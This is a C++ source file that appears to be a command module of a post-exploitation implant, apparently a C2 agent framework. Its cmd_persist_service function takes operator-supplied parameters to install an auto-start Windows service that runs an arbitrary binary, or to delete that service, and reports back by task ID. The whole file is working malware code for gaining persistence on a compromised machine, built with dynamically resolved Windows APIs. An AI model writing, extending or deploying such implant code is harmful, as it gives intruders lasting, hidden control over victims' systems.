#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PERSIST_SERVICE

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_persist_service(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action_str = parser_string( params, &action_len );
    uint32_t name_len = 0;
    auto name_str = parser_string( params, &name_len );
    uint32_t display_len = 0;
    auto display_str = parser_string( params, &display_len );
    uint32_t binpath_len = 0;
    auto binpath_str = parser_string( params, &binpath_len );

    if ( !action_str || action_len == 0 || !name_str || name_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need action and name" ) ) );
        return;
    }

    char action_buf[16] = { 0 };
    memory::copy( action_buf, action_str, action_len < 15 ? action_len : 15 );
    char name_buf[256] = { 0 };
    memory::copy( name_buf, name_str, name_len < 255 ? name_len : 255 );
    char display_buf[256] = { 0 };
    if ( display_str && display_len > 0 )
        memory::copy( display_buf, display_str, display_len < 255 ? display_len : 255 );
    char binpath_buf[512] = { 0 };
    if ( binpath_str && binpath_len > 0 )
        memory::copy( binpath_buf, binpath_str, binpath_len < 511 ? binpath_len : 511 );

    // Convert to wide strings for the W-variant APIs
    wchar_t w_name[256] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, name_buf, -1, w_name, 256 );
    wchar_t w_display[256] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, display_buf, -1, w_display, 256 );
    wchar_t w_binpath[512] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, binpath_buf, -1, w_binpath, 512 );

    bool is_install = str_cmp( action_buf,
        symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;

    if ( is_install ) {
        if ( !binpath_str || binpath_len == 0 ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "install requires binary_path" ) ) );
            return;
        }

        SC_HANDLE hSCM = inst.advapi32.OpenSCManagerW(
            nullptr, nullptr, SC_MANAGER_CREATE_SERVICE );
        if ( !hSCM ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "OpenSCManagerW failed" ) ) );
            return;
        }

        SC_HANDLE hService = inst.advapi32.CreateServiceW(
            hSCM,
            w_name,
            w_display[0] ? w_display : w_name,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            w_binpath,
            nullptr, nullptr, nullptr, nullptr, nullptr );

        if ( !hService ) {
            inst.advapi32.CloseServiceHandle( hSCM );
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "CreateServiceW failed" ) ) );
            return;
        }

        inst.advapi32.CloseServiceHandle( hService );
        inst.advapi32.CloseServiceHandle( hSCM );

        char out[320] = { 0 };
        str_copy( out, symbol<char*>( const_cast<char*>(
            "Service created: " ) ) );
        uint32_t off = str_len( out );
        memory::copy( out + off, name_buf, str_len( name_buf ) );
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
    } else {
        // remove
        SC_HANDLE hSCM = inst.advapi32.OpenSCManagerW(
            nullptr, nullptr, SC_MANAGER_ALL_ACCESS );
        if ( !hSCM ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "OpenSCManagerW failed" ) ) );
            return;
        }

        SC_HANDLE hService = inst.advapi32.OpenServiceW(
            hSCM, w_name, DELETE );
        if ( !hService ) {
            inst.advapi32.CloseServiceHandle( hSCM );
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "OpenServiceW failed" ) ) );
            return;
        }

        BOOL deleted = inst.advapi32.DeleteService( hService );
        inst.advapi32.CloseServiceHandle( hService );
        inst.advapi32.CloseServiceHandle( hSCM );

        if ( deleted ) {
            char out[320] = { 0 };
            str_copy( out, symbol<char*>( const_cast<char*>(
                "Service deleted: " ) ) );
            uint32_t off = str_len( out );
            memory::copy( out + off, name_buf, str_len( name_buf ) );
            queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "DeleteService failed" ) ) );
        }
    }
}

#endif
